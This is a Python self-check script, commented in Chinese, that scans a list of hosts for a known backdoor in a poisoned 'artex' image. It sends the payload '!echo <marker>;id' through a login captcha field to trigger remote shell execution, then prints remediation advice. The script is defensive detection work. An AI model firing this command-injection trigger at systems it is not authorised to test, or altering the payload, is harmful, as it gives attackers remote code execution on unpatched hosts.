#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ARTEX 镜像后门自查脚本（仅用于检查自己拥有/授权的系统）。

背景：被投毒的 artex 镜像在登录接口多收一个 captcha 字段，值以 "!" 开头时
会把后面的内容交给 shell 执行，并把输出放进响应的 captcha 字段返回，且在
用户名/密码校验之前就返回。正常版本没有这个字段，直接返回 401。

用法（脚本和 url.txt 放同一目录）：
    python artex_backdoor_check.py

也可以指定清单文件、线程数、超时：
    python artex_backdoor_check.py urls.txt --threads 16 --timeout 6

清单格式：每行一个地址，# 开头为注释，例如
    http://10.0.0.5:8787
    10.0.0.6:8787
    https://artex.example.com

脚本只发送一条只读载荷 `!echo <随机标记>;id`：
    - 有后门：响应 200 且 captcha 字段里出现随机标记（说明命令真的执行了）；
    - 正常：401/400，响应里没有 captcha 字段；
    - 端口不通 / 不是目标：单独标注，不混进结论。
结果写到脚本同目录的 artex_backdoor_result_<时间>.csv（UTF-8 带 BOM，Excel 直接打开）。

退出码：0 = 全部未发现；2 = 至少一台存在后门；1 = 脚本自身出错。
"""

from __future__ import annotations

import csv
import json
import os
import secrets
import ssl
import sys
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from urllib import error as urlerror
from urllib import request as urlrequest
from urllib.parse import urlsplit

ENDPOINTS = ("/api/auth/login", "/api/login")
UA = "artex-backdoor-selfcheck/1.0 (defensive; owner-authorized assets)"
MAX_EVIDENCE = 200

VULN = "存在后门"
VULN_NO_SH = "存在后门（无 sh，无法执行）"
CLEAN = "未发现"
SUSPECT = "疑似（需人工确认）"
NO_API = "接口不存在"
UNREACHABLE = "无法连接"


def load_targets(path: str) -> list[str]:
    if not os.path.isfile(path):
        sys.exit(f"找不到清单文件：{path}")
    out = []
    with open(path, "r", encoding="utf-8-sig", errors="replace") as fh:
        for line in fh:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            out.append(line)
    if not out:
        sys.exit(f"清单文件是空的：{path}")
    return out


def split_target(raw: str) -> list[str]:
    """把一行输入变成若干候选 origin（scheme://host:port）。"""
    raw = raw.strip().rstrip("/")
    has_scheme = "://" in raw
    if not has_scheme:
        raw = "//" + raw
    parts = urlsplit(raw)
    host = parts.netloc
    if not host:
        return []
    origin = f"{parts.scheme}://{host}" if parts.scheme else host
    if parts.scheme:
        return [f"{parts.scheme}://{host}"]
    # 没写协议：先试 http，连不上再试 https（在 probe 里处理）
    return [f"http://{origin}", f"https://{origin}"]


def make_opener(insecure: bool):
    if not insecure:
        return urlrequest.build_opener()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return urlrequest.build_opener(urlrequest.HTTPSHandler(context=ctx))


def post_json(opener, url: str, payload: dict, timeout: float):
    body = json.dumps(payload).encode("utf-8")
    req = urlrequest.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent", UA)
    req.add_header("Accept", "application/json")
    started = time.time()
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.status, resp.read(200_000).decode("utf-8", "replace"), time.time() - started, None
    except urlerror.HTTPError as e:
        return e.code, e.read(200_000).decode("utf-8", "replace"), time.time() - started, None
    except Exception as e:  # 连接拒绝、超时、TLS 错误等
        return None, "", time.time() - started, f"{type(e).__name__}: {e}"


def judge(status, body: str, marker: str):
    """根据响应判定是否后门。返回 (verdict, evidence, note)。"""
    snippet = " ".join(body.split())[:MAX_EVIDENCE]
    parsed = None
    if body.strip().startswith("{"):
        try:
            parsed = json.loads(body)
        except ValueError:
            parsed = None
    captcha = None
    exec_err = ""
    if isinstance(parsed, dict):
        for key, value in parsed.items():
            if key.lower() == "captcha":
                captcha = value if isinstance(value, str) else json.dumps(value, ensure_ascii=False)
            if key.lower() == "error" and isinstance(value, str):
                exec_err = value
        if captcha is None and not exec_err:
            captcha = None
    # 后门走到了 exec.Command("sh", ...) 但容器里没有 sh：命令执行不了，但后门确实存在。
    if exec_err and "sh" in exec_err and "not found" in exec_err:
        return VULN_NO_SH, exec_err[:MAX_EVIDENCE], "命令通道存在，但 PATH 里没有 sh，无法执行命令"
    if captcha is not None:
        if marker in captcha and "!echo" not in captcha:
            return VULN, captcha[:MAX_EVIDENCE], "命令已执行，回显见 captcha 字段"
        if marker in captcha:
            return SUSPECT, captcha[:MAX_EVIDENCE], "回显了完整输入，无法确认是否执行"
        return SUSPECT, captcha[:MAX_EVIDENCE], "返回了 captcha 字段但没有回显，需人工确认"
    if status == 200:
        return CLEAN, snippet, "HTTP 200 但没有 captcha 字段"
    if status in (400, 401, 403, 429):
        return CLEAN, snippet, f"HTTP {status}，无 captcha 字段"
    if status == 404:
        return NO_API, snippet, "接口不存在"
    if status is None:
        return UNREACHABLE, "", snippet
    return SUSPECT, snippet, f"意外状态码 {status}"


def check_one(target: str, timeout: float, insecure: bool) -> dict:
    marker = "hx" + secrets.token_hex(6)
    payload = {"username": "artex_probe", "password": secrets.token_hex(8), "captcha": f"!echo {marker};id"}
    opener = make_opener(insecure)
    origins = split_target(target)
    if not origins:
        return {"url": target, "endpoint": "-", "status": "-", "verdict": UNREACHABLE, "evidence": "", "ms": 0, "note": "地址格式无法解析"}

    last_error = ""
    for origin in origins:
        tried_404 = False
        for endpoint in ENDPOINTS:
            status, body, elapsed, err = post_json(opener, origin + endpoint, payload, timeout)
            if err:
                last_error = err
                break
            if status == 404:
                tried_404 = True
                continue
            verdict, evidence, note = judge(status, body, marker)
            return {"url": target, "endpoint": origin + endpoint, "status": status, "verdict": verdict,
                    "evidence": evidence, "ms": round(elapsed * 1000), "note": note}
        if tried_404:
            return {"url": target, "endpoint": origin, "status": 404, "verdict": NO_API,
                    "evidence": "", "ms": 0, "note": "两个候选登录接口都返回 404"}
    return {"url": target, "endpoint": origins[0], "status": "-", "verdict": UNREACHABLE,
            "evidence": "", "ms": 0, "note": last_error or "连接失败"}


def main() -> int:
    args = [a for a in sys.argv[1:]]
    threads = 8
    timeout = 8.0
    insecure = True
    targets_path = None
    i = 0
    while i < len(args):
        a = args[i]
        if a == "--threads" and i + 1 < len(args):
            threads = max(1, int(args[i + 1])); i += 2; continue
        if a == "--timeout" and i + 1 < len(args):
            timeout = float(args[i + 1]); i += 2; continue
        if a == "--verify-tls":
            insecure = False; i += 1; continue
        if a in ("-h", "--help"):
            print(__doc__); return 0
        targets_path = a; i += 1

    base_dir = os.path.dirname(os.path.abspath(__file__))
    if targets_path is None:
        targets_path = os.path.join(base_dir, "url.txt")
    elif not os.path.isabs(targets_path):
        targets_path = os.path.join(os.getcwd(), targets_path)

    targets = load_targets(targets_path)
    print(f"清单：{targets_path}（{len(targets)} 个目标），线程 {threads}，超时 {timeout}s")
    print("载荷：captcha = \"!echo <随机标记>;id\"（只读，不写文件不联网）\n")

    started = time.time()
    with ThreadPoolExecutor(max_workers=threads) as pool:
        results = list(pool.map(lambda t: check_one(t, timeout, insecure), targets))

    order = {VULN: 0, VULN_NO_SH: 1, SUSPECT: 2, NO_API: 3, UNREACHABLE: 4, CLEAN: 5}
    results.sort(key=lambda r: order.get(r["verdict"], 9))

    counts = {}
    for r in results:
        counts[r["verdict"]] = counts.get(r["verdict"], 0) + 1
        line = f"[{r['verdict']}] {r['url']}  接口={r['endpoint']}  状态={r['status']}  {r['ms']}ms"
        print(line)
        if r["verdict"] in (VULN, VULN_NO_SH, SUSPECT):
            print(f"    证据：{r['evidence']}")
        if r["note"]:
            print(f"    说明：{r['note']}")

    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_path = os.path.join(base_dir, f"artex_backdoor_result_{stamp}.csv")
    with open(out_path, "w", encoding="utf-8-sig", newline="") as fh:
        writer = csv.writer(fh)
        writer.writerow(["url", "登录接口", "HTTP状态", "判定", "证据(前200字符)", "耗时ms", "说明"])
        for r in results:
            writer.writerow([r["url"], r["endpoint"], r["status"], r["verdict"], r["evidence"], r["ms"], r["note"]])

    print("\n汇总：" + "；".join(f"{k} {v}" for k, v in sorted(counts.items(), key=lambda kv: order.get(kv[0], 9))))
    print(f"耗时 {time.time() - started:.1f}s，结果已写入：{out_path}")
    if any(r["verdict"] in (VULN, VULN_NO_SH) for r in results):
        print("\n有目标存在后门：立即断网隔离，检查该主机 /api/auth/login 的访问日志（带 captcha 字段的请求），"
              "轮换容器内能读到的全部凭据（jwt.key、数据库密码、模型 Key），再用自己编译的镜像重建。")
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())
